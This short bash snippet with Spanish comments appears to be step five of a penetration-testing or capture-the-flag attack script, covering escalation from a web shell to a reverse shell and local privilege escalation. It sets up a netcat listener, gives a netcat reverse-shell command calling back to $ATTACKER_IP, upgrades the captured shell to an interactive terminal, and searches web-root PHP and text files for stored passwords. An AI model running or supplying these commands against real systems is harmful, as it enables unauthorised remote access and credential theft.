echo -e "\n--- 5. Escalada a Reverse Shell y Local Privilege Escalation ---"

# 5.1. Configurar listener en la máquina del atacante:
nc -lvnp $LISTENER_PORT

# 5.2. Ejecutar reverse shell desde la shell web (sustituir $ATTACKER_IP):
# $(which nc) -e/bin/bash $ATTACKER_IP $LISTENER_PORT

# 5.3. Mejorar la shell después de la conexión:
script /dev/null -c bash
export TERM=xterm
export SHELL=bash
# suspendes la terminal ctrl+z
stty raw -echo; fg
reset

find /var/www/html/ -type f \( -name "*.php" -o -name "*.txt" \) -print 2>/dev/null | xargs -I {} sh -c 'grep -HnF "password" "{}" 2>/dev/null'
